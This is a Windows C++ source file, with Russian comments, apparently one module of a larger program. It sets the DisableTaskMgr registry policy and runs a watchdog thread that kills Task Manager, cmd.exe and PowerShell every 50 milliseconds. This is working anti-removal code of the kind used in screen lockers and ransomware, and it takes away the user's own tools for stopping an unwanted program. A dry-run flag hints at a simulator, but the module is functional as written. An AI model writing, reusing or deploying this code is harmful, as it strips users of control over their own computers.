/*
 * Защита (guard):
 *  - политика DisableTaskMgr=1 (HKCU) — диспетчер задач не открывается, в т.ч.
 *    через Ctrl+Alt+Delete;
 *  - watchdog-поток убивает taskmgr.exe / cmd.exe / powershell.exe.
 * guard_stop() восстанавливает политику.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <vector>

#include "config.h"
#include "utils.h"
#include "guard.h"

namespace {

const wchar_t *POLICY_SUBKEY = L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
const wchar_t *POLICY_NAME   = L"DisableTaskMgr";

volatile LONG g_stop_flag = 0;
HANDLE g_thread = NULL;

DWORD WINAPI watchdog(LPVOID) {
    std::vector<std::wstring> names;
    names.push_back(L"taskmgr.exe");
    names.push_back(L"cmd.exe");
    names.push_back(L"powershell.exe");
    while (!g_stop_flag) {
        util::kill_processes_named(names);
        Sleep(50);
    }
    return 0;
}

} /* namespace */

void guard_start() {
    if (util::dry_run_enabled()) return;
    util::reg_set_dword(HKEY_CURRENT_USER, POLICY_SUBKEY, POLICY_NAME, 1);
    g_stop_flag = 0;
    g_thread = CreateThread(NULL, 0, watchdog, NULL, 0, NULL);
}

void guard_stop() {
    InterlockedExchange(&g_stop_flag, 1);
    if (g_thread) {
        WaitForSingleObject(g_thread, 300);
        CloseHandle(g_thread);
        g_thread = NULL;
    }
    util::reg_delete_value(HKEY_CURRENT_USER, POLICY_SUBKEY, POLICY_NAME);
}
